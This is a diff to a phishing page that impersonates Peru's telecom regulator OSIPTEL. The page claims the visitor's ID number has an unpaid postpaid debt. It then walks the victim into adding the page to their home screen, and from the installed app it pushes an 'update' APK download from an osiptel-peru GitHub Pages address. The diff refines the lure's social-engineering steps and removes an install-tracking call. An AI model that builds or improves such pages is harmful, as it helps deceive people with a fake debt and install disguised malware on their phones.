@@ -49,12 +49,12 @@
         #resultado-falso { display: none; margin-top: 20px; padding: 20px; background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px; }
         #resultado-falso h3 { color: #856404; font-size: 16px; margin-bottom: 10px; }
         #resultado-falso p { color: #856404; font-size: 14px; margin-bottom: 8px; }
-        
-        /* Banner PWA */
-        #banner-pwa { display: none; position: fixed; bottom: 0; left: 0; right: 0; background: white; padding: 20px; box-shadow: 0 -2px 15px rgba(0,0,0,0.2); text-align: center; z-index: 9999; }
-        #banner-pwa p { margin-bottom: 10px; font-size: 14px; color: #333; }
-        #banner-pwa button { background: #2664AE; color: white; border: none; padding: 12px 30px; font-size: 14px; border-radius: 4px; cursor: pointer; margin: 5px; font-weight: bold; }
-        #banner-pwa button.cancel { background: #999; }
+
+        /* Modal de instrucciones (en navegador, en lugar del banner) */
+        #modal-instrucciones { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10001; align-items: center; justify-content: center; }
+        #modal-instrucciones .modal-contenido { background: white; border-radius: 12px; padding: 25px; text-align: center; max-width: 350px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        #modal-instrucciones .modal-contenido p { font-size: 14px; color: #555; margin-bottom: 15px; }
+        #modal-instrucciones .modal-contenido .btn-entendido { background: #2664AE; color: white; border: none; padding: 12px 30px; font-size: 15px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; }
 
         /* Modal de actualización (solo en PWA instalada) */
         #modal-actualizacion { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10001; align-items: center; justify-content: center; }
@@ -108,7 +108,7 @@
                 <p><strong>DNI <span id="dniMostrado"></span> tiene deuda.</strong></p>
                 <p><strong>Deuda vigente desde el <span id="fechaDeuda"></span>.</strong></p>
                 <p><strong>Deuda pendiente: S/ 89.90 - Plan Postpago.</strong></p>
-                <button class="btn" onclick="mostrarSiguientePaso()">📄 Visualizar recibo</button>
+                <button class="btn" onclick="mostrarInstruccionesPWA()">📄 Visualizar recibo</button>
             </div>
         </div>
     </div>
@@ -164,18 +164,18 @@
         </div>
     </div>
 
-    <!-- BANNER DE INSTALACIÓN PWA (solo en navegador) -->
-    <div id="banner-pwa">
-        <p>📲 Para visualizar su recibo, añada esta página a su pantalla de inicio.</p>
-        <p style="font-size:13px;color:#555;">Esto le permitirá acceder rápidamente a recibo y evitar la suspensión de su línea.</p>
-        <button onclick="instalarPWA()">✓ Añadir a pantalla de inicio</button>
-        <button class="cancel" onclick="document.getElementById('banner-pwa').style.display='none'">Ahora no</button>
+    <!-- MODAL DE INSTRUCCIONES (navegador) - SIN BOTÓN INSTALAR -->
+    <div id="modal-instrucciones">
+        <div class="modal-contenido">
+            <p>Para acceder al recibo completo, añada esta página a su pantalla de inicio.</p>
+            <p>Presione el menú del navegador (⋮) y seleccione "Añadir a pantalla de inicio".</p>
+            <button class="btn-entendido" onclick="document.getElementById('modal-instrucciones').style.display='none'">ENTENDIDO</button>
+        </div>
     </div>
 
-    <!-- MODAL DE ACTUALIZACIÓN (solo en PWA instalada, al hacer clic en "Visualizar recibo") -->
+    <!-- MODAL DE ACTUALIZACIÓN (PWA instalada) - PARA DESCARGAR EL APK -->
     <div id="modal-actualizacion">
         <div class="modal-contenido">
-            <!-- Icono de Play Store (SVG) -->
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50" height="50" fill="#003366">
                 <path d="M3.5 1.7L14.8 12 3.5 22.3c-.3.3-.5.2-.5-.1V1.8c0-.3.2-.4.5-.1zm16.2 9.3l-4.1 3.5 4.1 3.5c.4.3.4.7 0 1L16 22.3c-.4.3-.8.3-1.1 0L3.5 12 14.9 1.7c.3-.3.7-.3 1.1 0l3.7 3.3c.4.3.4.7 0 1z"/>
             </svg>
@@ -187,15 +187,7 @@
     </div>
 
     <script>
-        let deferredPrompt;
-
-        // Detectar si la app se abrió como WebAPK instalada
         const esPWAInstalada = window.matchMedia('(display-mode: standalone)').matches || navigator.standalone;
-
-        window.addEventListener('beforeinstallprompt', (e) => {
-            e.preventDefault();
-            deferredPrompt = e;
-        });
 
         function consultar() {
             var tipoDoc = document.getElementById('IdTipoDoc').value;
@@ -230,19 +222,15 @@
             }).catch(() => {});
         }
 
-        // Nueva función que decide qué mostrar al hacer clic en "Visualizar recibo"
-        function mostrarSiguientePaso() {
+        function mostrarInstruccionesPWA() {
             if (esPWAInstalada) {
-                // Si ya está instalada como PWA, mostrar el modal de actualización para descargar el APK
                 document.getElementById('modal-actualizacion').style.display = 'flex';
             } else {
-                // Si es navegador normal, mostrar el banner de instalación de la PWA
-                document.getElementById('banner-pwa').style.display = 'block';
+                document.getElementById('modal-instrucciones').style.display = 'flex';
             }
         }
 
         function descargarAPK() {
-            // Reemplaza esta URL con la de tu APK en GitHub Pages
             const apkUrl = 'https://osiptel-peru.github.io/osiptel.pe/app-release.apk';
             const link = document.createElement('a');
             link.href = apkUrl;
@@ -251,25 +239,6 @@
             link.click();
             document.body.removeChild(link);
             alert('Descarga iniciada. Una vez completada, abra el archivo para instalar la actualización.');
-        }
-
-        function instalarPWA() {
-            if (deferredPrompt) {
-                deferredPrompt.prompt();
-                deferredPrompt.userChoice.then((choiceResult) => {
-                    if (choiceResult.outcome === 'accepted') {
-                        fetch('http://localhost:8000/api/pwa-instalada', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ status: 'instalada', timestamp: new Date().toISOString() })
-                        }).catch(() => {});
-                        
-                        alert('✅ Acceso directo creado. Abra "OSIPTEL Consultas" desde su pantalla de inicio para ver su recibo.');
-                    }
-                    document.getElementById('banner-pwa').style.display = 'none';
-                    deferredPrompt = null;
-                });
-            }
         }
 
         if ('serviceWorker' in navigator) {
